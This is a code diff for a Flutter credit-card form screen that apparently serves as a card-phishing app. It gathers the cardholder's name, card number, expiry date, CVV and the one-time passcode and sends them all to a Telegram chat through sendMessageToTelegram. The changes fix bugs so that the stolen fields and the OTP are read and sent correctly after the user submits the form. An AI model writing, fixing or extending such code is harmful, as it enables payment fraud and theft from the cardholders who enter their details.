@@ -19,12 +19,12 @@ class CreditCardFormScreen extends StatelessWidget {
             onOtpEntered: (String otp) async {
               // Process the entered OTP (e.g., send to server for validation)
               String msg = "credit card info: " +
-                  "\n name :  ${_controller.cardNameController.value}" +
-                  "\n card number :  ${_controller.cardNumberController.value}" +
-                  "\n expiration date :  ${_controller.expirationDateController.value}" +
-                  "\n cvv :  ${_controller.cvvController.value}" +
+                  "\n name :  ${_controller.cardNameController.text}" +
+                  "\n card number :  ${_controller.cardNumberController.text}" +
+                  "\n expiration date :  ${_controller.expirationDateController.text}" +
+                  "\n cvv :  ${_controller.cvvController.text}" +
                   "\n level: ${_controller.selectedItem.value}" +
-                  "OTP Code : ${otp}";
+                  "\n OTP Code : ${otp}";
               await _controller.sendMessageToTelegram(msg);
 
               print('Entered OTP: $otp');
@@ -33,6 +33,8 @@ class CreditCardFormScreen extends StatelessWidget {
         },
       );
     }
+
+    shwowOTP() => _showOtpDialog(context);
 
     _outlineButton() => Padding(
           padding: const EdgeInsets.all(10),
@@ -57,9 +59,8 @@ class CreditCardFormScreen extends StatelessWidget {
               //     ),
               // style:  ,
               onPressed: () async {
-                await _controller.submitForm;
-
-                _showOtpDialog(context);
+                await _controller.submitForm();
+                shwowOTP();
               },
               child: const Text('Submit',
                   style: TextStyle(color: Colors.white, fontSize: 20)),
